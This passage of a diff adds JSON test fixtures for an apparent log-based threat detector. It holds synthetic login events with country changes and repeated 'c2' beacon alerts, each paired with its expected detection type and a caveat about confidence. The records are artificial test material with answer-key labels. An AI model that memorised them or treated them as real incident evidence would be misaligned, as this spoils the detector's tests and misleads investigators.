+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"US\", \"action\": \"login\", \"status\": \"success\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "GB",
+        "action": "login",
+        "status": "success",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"GB\", \"action\": \"login\", \"status\": \"success\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "FR",
+        "action": "login",
+        "status": "failed",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"FR\", \"action\": \"login\", \"status\": \"failed\"}"
+      }
+    ],
+    "expected_types": [
+      "country_change"
+    ],
+    "note": "Country change does not establish impossible travel; failed attempts do not establish account location."
+  },
+  {
+    "name": "periodic_checkin_pattern",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "c2",
+        "status": "alert",
+        "event_type": "beacon",
+        "destination_port": 443,
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"c2\", \"status\": \"alert\", \"event_type\": \"beacon\", \"destination_port\": 443}"
+      },
+      {
+        "timestamp": "2026-09-01T10:01:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "c2",
+        "status": "alert",
+        "event_type": "beacon",
+        "destination_port": 443,
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:01:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"c2\", \"status\": \"alert\", \"event_type\": \"beacon\", \"destination_port\": 443}"
+      },
+      {
+        "timestamp": "2026-09-01T10:02:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "c2",
+        "status": "alert",
+        "event_type": "beacon",
+        "destination_port": 443,
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:02:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"c2\", \"status\": \"alert\", \"event_type\": \"beacon\", \"destination_port\": 443}"
+      }
+    ],
+    "expected_types": [
+      "c2_beaconing"
+    ],
+    "note": "A scheduled benign agent can exhibit the same timing; this remains a medium-confidence hypothesis."
+  },
+  {
+    "name": "beacon_host_boundary",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "a",
+        "country": "UNKNOWN",
+        "action": "c2",
+        "status": "alert",
+        "event_type": "beacon",
+        "destination_port": 443,
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"a\", \"country\": \"UNKNOWN\", \"action\": \"c2\", \"status\": \"alert\", \"event_type\": \"beacon\", \"destination_port\": 443}"
+      },
+      {
+        "timestamp": "2026-09-01T10:01:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "b",
+        "country": "UNKNOWN",
+        "action": "c2",
+        "status": "alert",
+        "event_type": "beacon",
+        "destination_port": 443,
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:01:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"b\", \"country\": \"UNKNOWN\", \"action\": \"c2\", \"status\": \"alert\", \"event_type\": \"beacon\", \"destination_port\": 443}"
+      },
+      {
+        "timestamp": "2026-09-01T10:02:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "c",
+        "country": "UNKNOWN",
+        "action": "c2",
+        "status": "alert",
+        "event_type": "beacon",
+        "destination_port": 443,
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:02:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"c\", \"country\": \"UNKNOWN\", \"action\": \"c2\", \"status\": \"alert\", \"event_type\": \"beacon\", \"destination_port\": 443}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  }
+]
